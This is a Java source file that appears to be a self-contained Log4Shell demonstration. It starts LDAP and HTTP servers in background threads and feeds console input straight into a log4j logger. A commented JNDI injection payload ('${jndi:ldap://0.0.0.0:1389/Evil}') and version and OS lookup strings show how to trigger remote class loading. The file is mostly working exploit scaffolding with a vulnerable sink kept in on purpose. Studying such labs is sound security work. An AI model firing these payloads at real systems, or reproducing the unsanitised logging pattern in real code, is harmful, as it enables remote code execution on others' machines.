package org.example;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.Scanner;

public class App {
    public static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
    public static final Scanner scn = new Scanner(System.in);

    public static void main(String[] args) {
        new Thread(LDAPRefServer::start).start();
        new Thread(SimpleHttpServer::start).start();
        //${jndi:ldap://0.0.0.0:1389/Evil}
        //${java:version}
        //${java:os}
        while (true) {
            System.out.println("[+] Input your log:");
            String log = scn.nextLine();
            logger.error("{}", log);
        }
    }
}
